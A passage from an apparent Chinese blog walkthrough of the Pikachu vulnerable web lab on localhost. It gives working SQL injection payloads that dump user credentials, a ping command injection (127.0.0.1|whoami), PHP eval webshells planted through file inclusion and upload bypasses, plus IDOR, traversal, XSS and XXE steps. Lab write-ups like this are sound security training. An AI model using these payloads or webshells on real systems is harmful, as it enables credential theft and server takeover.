      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><code>substr()</code>: 这个函数用于从字符串中提取子字符串。在这个注入代码中，它用于限制 <code>group_concat()</code> 函数返回的字符串长度，以避免超过错误消息的大小限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261446954.png" alt="image-20240526144648900"></p>

        <h4 id="查看表字段名-1"   >
          <a href="#查看表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-1" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261448037.png" alt="image-20240526144842987"></p>

        <h4 id="查看字段内容-1"   >
          <a href="#查看字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-1" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261455784.png" alt="image-20240526145540702"></p>
<p>只有一条信息，型要看下一条就把1+31就行，表示从第32个字符开始</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),32,31),0x7e),1) #&amp;password=1&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261456614.png" alt="image-20240526145638554"></p>

        <h3 id="Update注入"   >
          <a href="#Update注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#Update注入" class="headerlink" title="Update注入"></a>Update注入</h3>
      <p>注册一个账号登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261459835.png" alt="image-20240526145930768"></p>
<p>点击修改个人信息修改后抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261503349.png" alt="image-20240526150314275"></p>
<p>也是POST传参</p>
<p>将sex值改为1‘，报错，表示闭合是单引号</p>

        <h4 id="获取数据库-1"   >
          <a href="#获取数据库-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-1"   >
          <a href="#获取数据库表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-1" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看表字段名-2"   >
          <a href="#查看表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-2" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-2"   >
          <a href="#查看字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-2" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) #&amp;phonenum=12306&amp;add=1&amp;email=5&amp;submit=submit</span><br></pre></td></tr></table></div></figure>


        <h2 id="“Delete”注入"   >
          <a href="#“Delete”注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#“Delete”注入" class="headerlink" title="“Delete”注入"></a>“Delete”注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231523066.png" alt="image-20240523152317026"></p>
<p>留言一条后删除并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261520524.png" alt="image-20240526152008451"></p>
<p>以GET方式传参id，那可以直接就在URL上更改，而且这个id的值为一个数字，推测应该是数字型注入，尝试更改id的值为1 or 1=1，删除成功，所以是数字型注入</p>

        <h4 id="获取数据库-2"   >
          <a href="#获取数据库-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-2"   >
          <a href="#获取数据库表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-2" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取表字段名"   >
          <a href="#获取表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31),0x7e),1) #</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-3"   >
          <a href="#查看字段内容-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-3" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1 or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;;&#x27;,password)) from users),1,31),0x7e),1) # </span><br><span class="line">//这是第一条字段内容</span><br></pre></td></tr></table></div></figure>


        <h2 id="http头注入"   >
          <a href="#http头注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231523881.png" alt="image-20240523152359853"></p>
<p>登录进去后，显示了我的一些http头信息，也就是说后台会获取 http头里的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261537320.png" alt="image-20240526153734251"></p>
<p>抓包，把 User-Agent 改为一个单引号，发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261541125.png" alt="image-20240526154130067"></p>
<p>发现直接报了 SQL 语法错误，所以这里就存在注入</p>
<p>可以直接用Insert注入的语句，但是最后的#要改成 or ‘，使得整个 <code>WHERE</code> 子句在逻辑上为真，注释后续内容</p>

        <h2 id="基于boolian的盲注"   >
          <a href="#基于boolian的盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231525628.png" alt="image-20240523152535603"></p>
<p>尝试之后只会返回存在/不存在这个用户，用dvwa中的布尔盲注和sqlmap注入流程</p>

        <h2 id="基于时间的盲注"   >
          <a href="#基于时间的盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231525510.png" alt="image-20240523152550485"></p>
<p>同dvwa时间盲注方式</p>

        <h2 id="宽字节注入"   >
          <a href="#宽字节注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2>
      
        <h6 id="当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节"   >
          <a href="#当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节" class="heading-link"><i class="fas fa-link"></i></a><a href="#当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节" class="headerlink" title="当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节"></a>当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节</h6>
      
        <h6 id="宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符"   >
          <a href="#宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符" class="heading-link"><i class="fas fa-link"></i></a><a href="#宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符" class="headerlink" title="宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符\"></a>宽字节注入是sql注入的一种手段，利用mysql使用GBK编码（因为GBK占用2个字节，而ascii占用1个字节），将两个字符看作一个汉字，从而消除转义字符\</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526614.png" alt="image-20240523152606588"></p>

        <h6 id="前一个字节ascii码要大于128才到汉字的范围"   >
          <a href="#前一个字节ascii码要大于128才到汉字的范围" class="heading-link"><i class="fas fa-link"></i></a><a href="#前一个字节ascii码要大于128才到汉字的范围" class="headerlink" title="前一个字节ascii码要大于128才到汉字的范围"></a>前一个字节ascii码要大于128才到汉字的范围</h6>
      <p>在单引号前面加上%df，让单引号成功逃逸，而且这关也类似于盲注，只会告诉你是否存在</p>

        <h1 id="RCE"   >
          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
      
        <h2 id="exec-“ping”"   >
          <a href="#exec-“ping”" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526021.png" alt="image-20240523152635997"></p>
<p>输入IP地址127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526901.jpg" alt="img"></p>
<p>再尝试输入127.0.0.1|whoami</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231526900.jpg" alt="img"></p>
<p>返回指向whoami的结果</p>

        <h2 id="exec-“eval”"   >
          <a href="#exec-“eval”" class="heading-link"><i class="fas fa-link"></i></a><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231528942.png" alt="image-20240523152803911"></p>

        <h6 id="eval是程序语言中的函数，功能是获取返回值"   >
          <a href="#eval是程序语言中的函数，功能是获取返回值" class="heading-link"><i class="fas fa-link"></i></a><a href="#eval是程序语言中的函数，功能是获取返回值" class="headerlink" title="eval是程序语言中的函数，功能是获取返回值"></a>eval是程序语言中的函数，功能是获取返回值</h6>
      <p>输入phoinfo();</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231528255.jpg" alt="img"></p>

        <h1 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1>
      
        <h2 id="本地文件包含"   >
          <a href="#本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529390.png" alt="image-20240523152924364"></p>
<p>随便选择一个提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529435.jpg" alt="img"></p>
<p>可以在url上看到这是一个文件file1.php</p>
<p>再尝试一下选择其他人物，发现文件依次变成了file2.php, file3.php, file4.php, file5.php</p>
<p>访问当前网页所在的文件目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529459.jpg" alt="img"></p>
<p>发现有一个file6.php，查看该文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529855.jpg" alt="img"></p>
<p>原来这是一个包含用户名和密码的文件</p>
<p>配合文件上传getshell，在Unsafe Fileupload处随便选一道题上传带有一句话木马的图片文件test.jpg（这里是用的getimagesize题里的）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529890.jpg" alt="img"></p>
<p>确定路径后回到题目构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/10/19/1759586530d08b36cd4162146851.jpg&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529923.jpg" alt="img"></p>
<p>可以看到上传成功，用蚁剑连接，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231529959.gif" alt="img"></p>

        <h2 id="远程文件包含"   >
          <a href="#远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531378.png" alt="image-20240523153105340"></p>
<p>还是随机选一个提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531906.jpg" alt="img"></p>
<p>首先生成一个文本文件remote.txt部署在服务器上,放在phpstudy的根目录下，写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd]) ?&gt; &#x27; ); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[http://localhost/pikachu/vul/fileinclude/fi_remote.php?filename=D:\phpstudy_pro\WWW\pikachu\remote.txt&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>

<p>然后发现shell.php文件已经写入该网页的目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531904.jpg" alt="img"></p>
<p>然后用蚁剑连接（URL地址应该是shell.php文件所在目录），连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231531901.jpg" alt="img"></p>

        <h1 id="不安全的文件下载"   >
          <a href="#不安全的文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1>
      <p>首先我们在该网页的目录D:\phpstudy_pro\WWW\pikachu\vul\unsafedownload\download下新建一个文本文档download.txt，写入111</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533978.jpg" alt="img"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533980.jpg" alt="img"></p>
<p>随便选择一个名字右键选择“在新窗口中打开链接”，这时它会下载该图片，同时新窗口也会显示该图片的链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533987.jpg" alt="img"></p>
<p>修改filename为download.txt，回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533988.jpg" alt="img"></p>
<p>即开始下载download.txt文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231533993.jpg" alt="img"></p>
<p>可以看到下载成功</p>

        <h1 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1>
      
        <h2 id="客户端check"   >
          <a href="#客户端check" class="heading-link"><i class="fas fa-link"></i></a><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534067.jpg" alt="img"></p>
<p>上传写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></div></figure>

<p>的test.jpg文件，同时抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534069.jpg" alt="img"></p>
<p>发送到Repeater后修改文件后缀为php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534082.jpg" alt="img"></p>
<p>发送之后可以在“响应”内看到修改后的上传的文件的路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534084.jpg" alt="img"></p>
<p>按这个路径到蚁剑进行连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231534078.jpg" alt="img"></p>
<p>连接成功</p>

        <h2 id="服务端check"   >
          <a href="#服务端check" class="heading-link"><i class="fas fa-link"></i></a><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535490.png" alt="image-20240523153514455"></p>
<p>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的，所以我们可以上传php文件，只需要抓包修改content-type修改就行</p>
<p>上传写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;shell&#x27;])?&gt;</span><br></pre></td></tr></table></div></figure>

<p>的test.php文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535842.jpg" alt="img"></p>
<p>抓包并发送到Repeater修改Content-Type为image/jpeg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535846.jpg" alt="img"></p>
<p>发送后可以看到上传成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535847.jpg" alt="img"></p>
<p>再用蚁剑连接，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231535862.jpg" alt="img"></p>

        <h2 id="getimagesize"   >
          <a href="#getimagesize" class="heading-link"><i class="fas fa-link"></i></a><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537198.jpg" alt="img"></p>
<p>getimagesize()这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的, 可在木马文件内容头部添加GIF89a(Gif图片文件头)</p>
<p>所以可以利用client check题里的jpg文件直接进行上传</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537196.jpg" alt="img"></p>
<p>上传成功，再用文件包含漏洞里构造的payload连接蚁剑，连接成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537203.jpg" alt="img"></p>

        <h1 id="越权"   >
          <a href="#越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#越权" class="headerlink" title="越权"></a>越权</h1>
      
        <h2 id="水平越权"   >
          <a href="#水平越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231537537.jpg" alt="img"></p>
<p>点击提示，选择lucy的账号进行登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538123.jpg" alt="img"></p>
<p>点击“点击查看个人信息”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538131.jpg" alt="img"></p>
<p>可以看到url也变化了，试试修改url上的username为lili，回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538133.jpg" alt="img"></p>
<p>可以看到登录账号换成了lili，个人信息也都变成了lili的信息</p>

        <h2 id="垂直越权"   >
          <a href="#垂直越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538194.jpg" alt="img"></p>
<p>直接登录超级boss的账号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538674.jpg" alt="img"></p>
<p>再登录pikachu账号看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538675.jpg" alt="img"></p>
<p>只有超级boss才有添加用户的权限，那么关键也在添加用户权限这里，那么重新登录admin账号添加用户</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538677.jpg" alt="img"></p>
<p>复制url后退出登录，再次登录pikachu的账号，然后粘贴刚刚复制的url，可以看到现在已经是pikachu在操作添加用户了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538678.jpg" alt="img"></p>
<p>点击“创建”后再次登录pikachu的账号查看，可以看到用pikachu账号添加用户成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231538691.jpg" alt="img"></p>

        <h1 id="目录遍历"   >
          <a href="#目录遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539650.png" alt="image-20240523153932619"></p>
<p>随便点击一个链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539286.jpg" alt="img"></p>
<p>可以看到变量title是文件名，我们可以更改为上级目录下的dir.php文件，即构造</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=../dir.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231539293.jpg" alt="img"></p>
<p>成功打开了该文件</p>

        <h1 id="敏感信息泄露"   >
          <a href="#敏感信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1>
      <p>提示我们很多地方都漏点，查看网页源代码， 发现有注释掉的测试用户的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231541457.png" alt="image-20240523154108422"></p>
<p>登录一下， 登录成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231540439.jpg" alt="img"></p>

        <h1 id="PHP反序列化"   >
          <a href="#PHP反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231541664.png" alt="image-20240523154156629"></p>
<p>简单构造一个序列化的数据，插入XSS代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class S &#123;</span><br><span class="line">    public $test = &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new S();</span><br><span class="line"></span><br><span class="line">// 序列化User对象</span><br><span class="line">$serialized = serialize($test);</span><br><span class="line">echo &quot;序列化后的用户对象：&quot; . $serialized . &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>序列化结果为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>输入并提交，出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557379.png" alt="image-20240523155718329"></p>

        <h1 id="XXE漏洞"   >
          <a href="#XXE漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1>
      <p>DTD, 即文档定义类型, 用来为XML文档定义语义约束</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--声明xml的版本号--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--定义此文档是note类型的文档--&gt;</span><br><span class="line">&lt;!DOCTYPE note[ &lt;!--外部实体声明--&gt;    </span><br><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;]&gt;&lt;!--文档元素--&gt; </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557501.jpg" alt="img"></p>
<p>可以构建恶意xml通过post请求提交，在输入框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY test &quot;hey&quot;&gt;</span><br><span class="line">]&gt;&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231557502.jpg" alt="img"></p>
<p>有返回hey</p>

        <h1 id="URL重定向"   >
          <a href="#URL重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1>
      <p> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559072.jpg" alt="img"></p>
<p> 依次点击每一条链接，到“像秋天的风一样的少年”才会有网页跳转，跳转到unsafere.php <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231559073.jpg" alt="img"></p>
